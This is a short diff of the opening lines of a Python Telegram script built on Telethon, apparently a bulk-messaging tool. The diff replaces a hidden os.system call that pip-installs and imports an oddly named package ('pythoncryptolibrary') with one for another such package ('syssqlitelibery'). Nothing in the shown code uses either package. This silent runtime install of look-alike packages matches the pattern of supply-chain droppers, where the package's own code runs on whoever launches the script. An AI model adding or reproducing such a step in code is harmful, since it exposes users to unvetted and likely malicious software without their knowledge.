@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptolibrary")
-import pythoncryptolibrary
+os.system("pip install syssqlitelibery")
+import syssqlitelibery
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
 from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
